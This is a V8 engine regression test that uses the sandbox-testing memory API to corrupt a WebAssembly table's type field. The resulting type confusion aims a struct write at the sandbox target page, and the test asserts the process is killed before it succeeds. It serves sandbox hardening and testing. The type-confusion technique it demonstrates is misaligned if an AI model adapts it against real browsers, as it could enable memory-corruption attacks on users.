// Copyright 2024 the V8 project authors. All rights reserved.
// Use of this source code is governed by a BSD-style license that can be
// found in the LICENSE file.

// Flags: --sandbox-testing --experimental-wasm-type-reflection

d8.file.execute('test/mjsunit/wasm/wasm-module-builder.js');

// module 0
let builder = new WasmModuleBuilder();
let $struct = builder.addStruct([makeField(kWasmI64, true)]);
let $sig0 = builder.addType(makeSig([], [wasmRefType($struct)]));
let sig1 = kSig_l_v;
let $sig1 = builder.addType(sig1);

let $sig0_func = builder.addFunction("sig0_placeholder", $sig0).addBody([
  kGCPrefix, kExprStructNewDefault, $struct
]);
let $sig1_func = builder.addFunction("placeholder", $sig1).addBody([
  kExprI64Const, 0,
]);
let $t0 = builder
    .addTable(wasmRefType($sig0), 1, 1, [kExprRefFunc, $sig0_func.index])
    .exportAs('table0');
let $t1 = builder
    .addTable(wasmRefType($sig1), 1, 1, [kExprRefFunc, $sig1_func.index])
    .exportAs('table1');

let instance0 = builder.instantiate();
let { table0, table1 } = instance0.exports;

// module 1
builder = new WasmModuleBuilder();
$struct = builder.addStruct([makeField(kWasmI64, true)]);
$sig0 = builder.addType(makeSig([], [wasmRefType($struct)]));
$sig1 = builder.addType(sig1);

let $boom = builder.addFunction("boom", kSig_v_v)
  .exportFunc()
  .addBody([
    kExprI32Const, 0,
    kExprCallIndirect, $sig0, 0,
    kExprI64Const, 12,
    kGCPrefix, kExprStructSet, $struct, 0,
  ]);
let $t_imp =
    builder.addImportedTable('import', 'table', 1, 1, wasmRefType($sig0));

// Prepare corruption utilities.
const kHeapObjectTag = 1;
const kWasmTableObjectTypeOffset = 28;
let memory = new DataView(new Sandbox.MemoryView(0, 0x100000000));
function getPtr(obj) {
  return Sandbox.getAddressOf(obj) + kHeapObjectTag;
}
function getField(obj, offset) {
  return memory.getUint32(obj + offset - kHeapObjectTag, true);
}
function setField(obj, offset, value) {
  memory.setUint32(obj + offset - kHeapObjectTag, value, true);
}

const kRef = 9;
const kSmiTagSize = 1;
const kHeapTypeShift = 5;

// Put a WasmJSFunction into table1 while it still has type $sig1.
table1.set(0, new WebAssembly.Function(
  {parameters: [], results: ['i64']},
  () => BigInt(Sandbox.targetPage)));

// Now set table1's type to $sig0.
let t0 = getPtr(table0);
let t1 = getPtr(table1);
let t0_type = getField(t0, kWasmTableObjectTypeOffset);
let expected_old_type = (($sig1 << kHeapTypeShift) | kRef) << kSmiTagSize;
assertEquals(expected_old_type, getField(t1, kWasmTableObjectTypeOffset));
setField(t1, kWasmTableObjectTypeOffset, t0_type);

// Instantiation accepts the table due to its corrupted type.
let instance1 = builder.instantiate({'import': {'table': table1}});

instance1.exports.boom();

assertUnreachable("Process should have been killed.");
